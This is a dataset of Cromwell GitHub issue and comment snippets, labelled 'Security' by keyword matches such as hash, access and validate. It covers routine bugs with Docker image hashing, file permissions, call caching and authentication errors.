Security,"We are trying to expose workflow failure messages to the user in Firecloud. However, the failures field seems to have an inconsistent format:. Compare the failures sections for the following:. ```; {; ""workflowName"": ""echo_strings"",; ""submittedFiles"": {; ""inputs"": ""{...},; ""calls"": {; ""echo_strings.echo_files"": [{; ""preemptible"": false,; ""retryableFailure"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://fc-2d3fd356-e3be-4953-92f1-60af623e6fa5/b6b190d6-8640-4638-94cd-15f16b194f38/echo_strings/c386672d-0248-4968-9b1a-114f5f5c4706/call-echo_files/echo_files-stdout.log"",; ""backendStatus"": ""Failed"",; ""shardIndex"": -1,; ""jes"": {; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""machineType"": ""us-central1-c/n1-standard-1"",; ""googleProject"": ""broad-dsde-dev"",; ""executionBucket"": ""gs://cromwell-dev/cromwell-executions"",; ""zone"": ""us-central1-c"",; ""instanceName"": ""ggp-3462354720519617596""; },; ""runtimeAttributes"": {...},; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""CallCachingOff"",; ""inputs"": {...; },; ""failures"": [{; ""message"": ""Task c386672d-0248-4968-9b1a-114f5f5c4706:echo_files failed: error code 5. Message: 8: Failed to pull image ubuntu:latest: \""docker --config /tmp/.docker/ pull ubuntu:latest\"" failed: exit status 1: Pulling repository docker.io/library/ubuntu\nNetwork timed out while trying to connect to https://index.docker.io/v1/repositories/library/ubuntu/images. You may want to check your internet connection or if you are behind a proxy.\n""; }],; ""jobId"": ""operations/EJiq_oWfKxi8-N-X4qiwhjAgw7vetLsXKg9wcm9kdWN0aW9uUXVldWU"",; ""backend"": ""JES"",; ""end"": ""2017-01-30T19:14:19.708Z"",; ""stderr"": ""gs://fc-2d3fd356-e3be-4953-92f1-60af623e6fa5/b6b190d6-8640-4638-94cd-15f16b194f38/echo_strings/c386672d-0248-4968-9b1a-114f5f5c4706/call-echo_files/echo_files-stderr.log"",; ""callRoot"": ""gs://fc-2d3fd356-e3be-4953-92f1-60af623e6fa5/b6b190d6-8640-4638-94cd-15f16b194f38/echo_strings/c386672d-0248-4968-9b1a-114f5f5c4706/call-echo_files"",; ""at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037:17,expose,expose,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037,1,['expose'],['expose']
Security,"We are using a local docker registry to run WDL workflows. A typical format of the image from local registry is as such: `example.com:port/imageName:tag`. However, when hash-lookup local method is enabled, it adds a 'library' repository to the image path. Final image path for the above image then becomes: `example.com:port/library/imageName:tag`.; The onus of providing optional repository field to the image path should be on the User, rather than Cromwell trying to guess the repository name and also as long as Docker is able to correctly parse this, it should not be a fail criteria; (Please correct me if I am missing something here). Also, the example image I pasted above, is a valid format and docker is able to pull the image with this path with no issues. I tested this with disabling `docker.hash-lookup.enable=false`. The workflow was able to run successfully. . For context pasting the offending line here:; https://github.com/broadinstitute/cromwell/blob/88765daeb265b66d2f2a87f62635b50e4f95733a/dockerHashing/src/main/scala/cromwell/docker/DockerImageIdentifier.scala#L17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6172:169,hash,hash-lookup,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172,2,['hash'],['hash-lookup']
Security,"We are using cromwell server to run workflows in a shared HPC environment. As it is a shared environment and we are dealing with sensitive data, we have purposely set cromwell to use umask 0007 so that others can't access our files. However, cromwell seems to override the umask and gives rwx world permissions on all directories it creates. . As far as I can tell, the override is programmed here:; cromwell/core/src/main/scala/cromwell/core/path/EvenBetterPathMethods.scala. Beyond it being non-ideal from a security perspective, this ends up causing downstream ""access denied"" problems for us when cromwell creates directories downstream of a linux access control list (ACL). It seems like what is happening in this case is (1) the directory is created via cromwell (2) via the OS, the ACL is applied to the folder, giving user & group privileges (3) the world privileges are modified via cromwell, which disrupts the ACL, thus the user and group lose all privileges (4) access denied error when cromwell tries to use the folder",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333:215,access,access,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333,5,"['access', 'secur']","['access', 'security']"
Security,"We can't really make our images private because we want our workflows to be publicly accessible, especially for Terra users. We can make mirrors of our GCR image repositories across regions -- hopefully that will eliminate this type of event for the most part. But we'll still be dependent on our users to to use the right mirrors (as @freeseek just noted above).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729:85,access,accessible,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729,1,['access'],['accessible']
Security,We currently do have basic backend validation. Closing this on the expectation that we can always have a more specific new ticket if necessary.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-254296481:35,validat,validation,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-254296481,2,['validat'],['validation']
Security,"We currently support dockerhub, google container registry and quay as far as looking up hashes is concerned. With the way things are currently, if one of those services goes down or has a high error rate forcing us to retry a lot, all lookups will potentially be slowed down even if they target a service that is doing fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332941637:88,hash,hashes,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332941637,1,['hash'],['hashes']
Security,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:289,hash,hash,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414,1,['hash'],['hash']
Security,"We experience this issue in a production environment, too. It's a big problem because in our environment cromwell is part of an automated system that collects new data, runs analysis workflows, and accessions the results to a public archive. Part of the provenance metadata that goes along with workflow runs is the docker image id that was used during the run. Having a value for that key be missing sometimes breaks the code that passes that important provenance information on to the next level of metadata.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4001#issuecomment-557754879:198,access,accessions,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4001#issuecomment-557754879,1,['access'],['accessions']
Security,We had to add prepend `docker.io` to the image name to get authentication to work so `docker.io/broadinstitute/cloud-cromwell`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470:59,authenticat,authentication,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470,1,['authenticat'],['authentication']
Security,"We have a task that takes in an Optional int but when we call that task with no value for that int the workflow falls over. It might not work for other types of Optionals either but I'm not sure. Hash for this cromwell 24 was b71f06f. This works on 19 (yes we're still on 19 =/). Task (stuff removed):. ```; task ValidateSamFile {; File input_bam; File? input_bam_index; String report_filename; File? ref_dict; File? ref_fasta; File? ref_fasta_index; Int? max_output; Array[String]? ignore; Int disk_size; Int preemptible_tries. command {; java -Xmx4000m -jar stuff.jar blah; }; runtime {; memory: ""7 GB""; disks: ""local-disk "" + disk_size + "" HDD""; preemptible: preemptible_tries; }; output {; File report = ""${report_filename}""; }; }; ```. Call (note there is no value supplied for max_output):. ```; call ValidateSamFile as ValidateReadGroupSamFile {; input:; ref_fasta = ref_fasta,; ref_fasta_index = ref_fasta_index,; ref_dict = ref_dict,; input_bam = SortAndFixReadGroupBam.output_bam,; report_filename = sub(sub(unmapped_bam, sub_strip_path, """"), sub_strip_unmapped, """") + "".validation_report"",; disk_size = flowcell_medium_disk,; preemptible_tries = preemptible_tries; }; ```. error in server logs:; ```; 2017-01-23 15:09:09 [cromwell-system-akka.actor.default-dispatcher-89] ERROR c.b.i.j.JesAsyncBackendJobExecutionActor - JesAsyncBackendJobExecutionActor [UUID(8f35e32d)PairedEndSingleSampleWorkflow.Vali; dateReadGroupSamFile:1:1]: Error attempting to Execute; java.lang.UnsupportedOperationException: Could not find declaration for WdlOptionalValue(WdlIntegerType,None); at wdl4s.command.ParameterCommandPart.instantiate(ParameterCommandPart.scala:48); at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1943:196,Hash,Hash,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1943,4,"['Hash', 'Validat']","['Hash', 'ValidateReadGroupSamFile', 'ValidateSamFile']"
Security,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:131,inject,injection,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893,2,['inject'],['injection']
Security,"We have not consistently been able to keep the JIRA board configured for the partial public access we need. The JIRA instance is shared by many groups and has to meet a lot of compliance needs, and the Cromwell access seems to get lost in the shuffle. I think it's more likely that we will remove the link to JIRA and suggest sticking to Github issues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783:92,access,access,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783,2,['access'],['access']
Security,"We have several cromwell jobs that appear to be running, but are done with a task that should have been recognized as complete. An example is f86ff9ef-ea1c-47f3-a513-8d6311a27c7b - running on gotc prod; https://cromwell.gotc-prod.broadinstitute.org/api/workflows/v1/f86ff9ef-ea1c-47f3-a513-8d6311a27c7b/metadata; The workflow was launched on May 15 and ran normally until; A task - 'ValidateAggregatedSamFile' was preempted. A retry was then attempted, and that retry is stuck in status 'Running' although the job appeared to have executed correctly:; see expected/normal output in:; https://console.cloud.google.com/storage/browser/broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/f86ff9ef-ea1c-47f3-a513-8d6311a27c7b/call-ValidateAggregatedSamFile/. Looking at the logs on gotc-cromwell-prod201 (/local/cromwell_logs/20160516-cromwell.log). It looks like the retried job never switched to 'Initializing' (the log says it was changing the jobs status but the database does not reflect that); i.e. this line:; 2016-05-16 20:17:22,463 cromwell-system-akka.actor.default-dispatcher-22 INFO - JES Run [UUID(f86ff9ef):ValidateAggregatedSamFile:2]: JES Run ID is operations/EPaL3dnLKhiY9KCP1rC04ekBIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl; 2016-05-16 20:17:22,484 cromwell-system-akka.actor.default-dispatcher-17 INFO - JES Run [UUID(f86ff9ef):ValidateAggregatedSamFile:2]: Status change from - to Initializing. But the database says the job is still 'Running'.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/904:383,Validat,ValidateAggregatedSamFile,383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/904,4,['Validat'],['ValidateAggregatedSamFile']
Security,"We have users with the same use case as the second paragraph: ""most of your workflow worked well but fails in the end. You figure out the problem and you do not want to start it from the very beginning as intermediate results are already recorded to the Cromwell-execution folder"". More specifically, the harder case is when you have a scatter (say 100 way wide) and 98 succeed, but the other two fail. You figure out what changes to your command/docker that would fix this and you want to resume those with this change. Since Cromwell would only rerun for these failed tasks it wouldn't cause call caching confusion (rerun the succeeded tasks again), and these new runs would call cache to different hashes than had the original cached. If you were to run this same workflow again with the same data, those 98 that succeeded would not be able to call cache because you changed your task or docker, but I feel this is fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970:701,hash,hashes,701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970,2,['hash'],['hashes']
Security,"We need to re-figure out our hashing strategy for docker images, especially in GCR. In the meantime, any GCR image that does not have a `v2+json` hash available will run, but will always fail call caching. We currently request a ""v2+json"" Docker-Content-Digest for all GCR images. Recently, GCR [""correctly""](https://enterprise.google.com/supportcenter/managecases#Case/0016000000MNGDy/U-13919143) returns 404 when it doesn't actually have ""v2+json"" for the images. There does appear to be an alternative ""v1+prettyjws"" Docker-Content-Digest available for GCR images. (FYI there are a [number of search hits](https://www.google.com/search?q=Docker-Content-Digest) re: ""Docker-Content-Digest"", especially v1 vs. v2, etc.) It's likely that Google's ""correction"" mentioned above was to fix the server from returning the wrong ""v1"" hash when ""v2"" was requested-but-not-available. While cromwell only uses the headers via HTTP HEAD, the hashes in the headers and the contents of an HTTP GET _are_ different between v1 and v2. Google tech support have also mentioned that clients may request either hash type, submitting both `Accept` headers, and that one can read the `Content-Type` from the server to determine which `Docker-Content-Digest` was returned. Bodies reformatted by jq for readability:; ```bash; $ curl -i -s -H 'Accept: application/vnd.docker.distribution.manifest.v1+prettyjws' https://gcr.io/v2/google-containers/ubuntu-slim/manifests/0.14; HTTP/1.1 200 OK; Docker-Distribution-API-Version: registry/2.0; Content-Type: application/vnd.docker.distribution.manifest.v1+prettyjws; Content-Length: 2647; Docker-Content-Digest: sha256:781290a693dc805993b19b7b4c5be40f7688f595312646b926abe2baae2fa9ff; Date: Mon, 06 Nov 2017 16:15:32 GMT; Server: Docker Registry; X-XSS-Protection: 1; mode=block; X-Frame-Options: SAMEORIGIN; Alt-Svc: quic="":443""; ma=2592000; v=""41,39,38,37,35"". {; ""name"": ""unused"",; ""tag"": ""unused"",; ""architecture"": ""amd64"",; ""fsLayers"": [; {; ""blobSum"": ""sha256:a3ed95caeb02f",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2826:29,hash,hashing,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2826,4,['hash'],"['hash', 'hashes', 'hashing']"
Security,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:956,authoriz,authorized,956,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357,3,"['access', 'authoriz', 'password']","['access', 'authorized', 'password']"
Security,"We received a workaround from Travis support and I was able to rotate the Vault access token. Follow details over at https://support.travis-ci.com/hc/en-us/requests/3231 but the TL;DR is to use the travis rest-api **V3**, not the travis web-ui nor the travis cli.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4585#issuecomment-457671476:80,access,access,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4585#issuecomment-457671476,1,['access'],['access']
Security,We talked about this with Ruchi and I guess we could be very forgiving in the way we validate those docker strings. If it ends up being an invalid docker image the job won't run anyway when we get to that point so..,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2797#issuecomment-340481018:85,validat,validate,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2797#issuecomment-340481018,1,['validat'],['validate']
Security,"We track collection via a label injection. If a workflow dies early on, eg MWDA, the label doesn't appear to be persisted and thus the user can't look up errors for their WF",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3225:32,inject,injection,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3225,1,['inject'],['injection']
Security,We want the following tables:; - [x] Call Caching Hashes. | HashID | HashKey | HashValue | CCRID |; | --- | --- | --- | --- |; | (Primary key) | | | (FK to Call Caching Job Result MetaInfo) |; - [x] Call Caching Job Result MetaInfo. | CCRID | Workflow UUID | Call FQN | Index | AllowsResultReuse |; | --- | --- | --- | --- | --- |; | (Primary key) | | | | |; - [x] Call Caching Job Result Store. | JRSID | Key | Value | CCRID |; | --- | --- | --- | --- |; | (Primary Key) | (Like metadata key) | (Like metadata value) | (FK to Call Caching Job Result MetaInfo) |,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1224:50,Hash,Hashes,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1224,4,['Hash'],"['HashID', 'HashKey', 'HashValue', 'Hashes']"
Security,"We're getting into automatic docker tag generation, so I could see getting; beyond 255. On Aug 17, 2016 8:47 PM, ""Lee Lichtenstein"" lichtens@broadinstitute.org; wrote:. > +1 for 1024; > ; > On Aug 17, 2016 5:09 PM, ""mcovarr"" notifications@github.com wrote:; > ; > > HASH_VALUE in CALL_CACHING_HASH is VARCHAR(255), so we shouldn't have; > > this particular problem. But given that the Docker hashes we generate are; > > functions of Docker image names and those seem to have the potential to be; > > very long, we might want to think about an even larger field.; > > ; > > —; > > You are receiving this because you were mentioned.; > > Reply to this email directly, view it on GitHub; > > https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,; > > or mute the thread; > > https://github.com/notifications/unsubscribe-auth/ACDXkyM0b_81HFK68jJ5Hn71QHaO9qOwks5qg3h-gaJpZM4JmwYu; > > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240594318:392,hash,hashes,392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240594318,1,['hash'],['hashes']
Security,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:130,hash,hashing,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663,1,['hash'],['hashing']
Security,"We've seen several workflows fail with this error:. 2016-05-10 11:38:08,737 cromwell-system-akka.actor.default-dispatcher-3 ERROR - WorkflowActor [UUID(972b838f)]: Completion work failed for call CollectUnsortedReadgroupBamQualityMetrics:10.; java.net.SocketTimeoutException: Read timed out;   at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72];   at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72];   at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72];   at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72];   at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72];   at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72];   at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72];   at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72];   at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72];   at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72];   at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72];   at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72];   at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72];   at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72];   at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72];   at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72];   at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72];   at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72];   at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.jar:0.19];   at ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/826:625,secur,security,625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/826,5,['secur'],['security']
Security,"Well, here's a use case. I want to run the same workflow on exomes and on whole genomes, and some of my parameters take different defaults depending on the data type. It would be swell to be able to say e.g. `my_param = param_values[data_type]` assuming I've set up my defaults as maps with e.g. 'wgs' and 'exome' as keys, and I can somewhere set `data_type = 'wgs'` (because presumably several values would need to be switched) (by the way, does wdl have enums?). So I'd have defaults that are variable references -- but I might decide to use something else entirely and just input my_workflow.my_param = 5 in my json for whatever reason. . Is that crazy/wrong?. I guess I could instead do the override by injecting the value I want into `param_values`...? But then I'm constrained to work with whatever `data_types` have been planned for and can't add something different on the fly. . Does any of this make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098:707,inject,injecting,707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098,1,['inject'],['injecting']
Security,"What authentication mode are you running in (default credentials, service account or refresh token)? Does your config make use of private dockerhub credentials. I'm wondering why it's writing an authorization at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895:5,authenticat,authentication,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,2,"['authenticat', 'authoriz']","['authentication', 'authorization']"
Security,"What behavior would be desired, in this case? One required behavior would be that the workflow should still run (I presume). Anything else? @geoffjentry @ruchim . Is this the same as if the user specifies a table to which they don't have access?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502198188:238,access,access,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502198188,1,['access'],['access']
Security,"When Cromwell is finding a successful call cache hit, it is failing to copy the file even though the user has access to it. This causes the workflow to be rerun rather than copying the cached results. . Inside Failures you can see the following error:; ```[Attempted 1 time(s)] - HttpResponseException: 400 Bad Request { ""error"": { ""errors"": [ { ""domain"": ""global"", ""reason"": ""required"", ""message"": ""Bucket is requester pays bucket but no user project provided."" } ], ""code"": 400, ""message"": ""Bucket is requester pays bucket but no user project provided."" } }```. https://portal.firecloud.org/#workspaces/dvoet-prod-test-20190305-3/dvoet_tutorial_requester_pays/monitor/9d516b3c-5b7f-4241-9929-99b54ef7e7e1/102e99b1-26b2-4bf4-80ec-fcc02c32136d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4756:110,access,access,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4756,1,['access'],['access']
Security,"When I try to have something like; ```wdl; runtime {; docker: ""quay.io/biocontainers/star@sha256:f9b0406354ff2e5ccfadaef6fde6367c7bcb4bdc7e67920f0f827a6ff6bf4fb5"" #2.7.2b--0; cpu: ""4""; memory_mb: ""51200""; }; ```; WOMTool validates it as valid WDL, but cromwell Server fails the workflow with:; ```; Workflow failed. WorkflowFailure(java.lang.IllegalArgumentException: No coercion defined from '4' of type 'java.lang.Integer' to 'String?'.,List(WorkflowFailure(No coercion defined from '4' of type 'java.lang.Integer' to 'String?'.,List()))); ```; I enclose ZIP with my WDL, input and application.json.; I run cromwell with Ubuntu Server 18.04.LTS; [cpu_coercion_bug.zip](https://github.com/broadinstitute/cromwell/files/3591979/cpu_coercion_bug.zip)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5166:221,validat,validates,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5166,1,['validat'],['validates']
Security,"When I use cromwell, I often would like to be able to refer to the most recent files that we produced while also keeping earlier versions. This way a user could refer to a file as,; cromwell-executions/Workflow/current/call-Job/shard-3/execution/filename; instead of; cromwell-executions/Workflow/ebbf651b-2dc6-4066-9e8d-b4e2ca722c1e/call-Job/shard-3/execution/filename; or some other hash that is subject to change.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1814:385,hash,hash,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1814,1,['hash'],['hash']
Security,"When WOMtool validates a WDL with local imports at relative directory paths, it fails:; ```; $ java -jar womtool-33.1.jar validate WdlWithLocalRelativeImports.wdl ; Failed to import workflow ../../other_dir/TasksToImport.wdl.:; Bad import ../../other_dir/TasksToImport.wdl: ../../other_dir/TasksToImport.wdl is not a valid import; Bad import ../../other_dir/TasksToImport.wdl: ../../other_dir/TasksToImport.wdl is not a valid import; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3831:13,validat,validates,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3831,2,['validat'],"['validate', 'validates']"
Security,"When a user specifies a Docker image of `whoever/myimage:latest`, they almost certainly don't want to avoid to a version of the job that was latest two years ago. This is the current behaviour. Please instead resolve the string to a Docker image hash and use that for call caching instead. The final Docker hash used should end up in call-level metadata so we can know what it is later. Tagging @abaumann so he knows I made this and can chime in to agree with me if there are any questions. Further Refinement from Office Hours:; - Supported Docker Image Repository; -- must have: DockerHub, GCR; -- should have: ECR if it doesn't delay, otherwise a separate ticket; -- bonus points to verify this works against Quay ; - Only API v2 supported ; - Support for both public and private images",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617:246,hash,hash,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617,2,['hash'],['hash']
Security,"When a workflow fails before any calls are created (e.g. during validation, or with bad credentials to talk to JES, etc) a workflow metadata is created with an empty calls section (see below). When this metadata is rendered in the timing diagram, you just get a page with a (. This is important in FireCloud because it makes the user think something else is broken. It would be better if instead simple text were shown saying ""No calls found for this workflow"". A nice way to debug/develop this is to temporarily have the timing diagram page read from a static URL instead of the metadata endpoint by changing this line in `drawChart()`. $.getJSON(""/bad.md.txt"", function(data) {. And then running a simple web server from your cromwell root with:. `python -m SimpleHTTPServer 8000`. and then hitting the timing diagram at:. `http://localhost:8000/engine/src/main/resources/workflowTimings/workflowTimings.html`. [bad.md.txt](https://github.com/broadinstitute/cromwell/files/721189/bad.md.txt)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1887:64,validat,validation,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1887,1,['validat'],['validation']
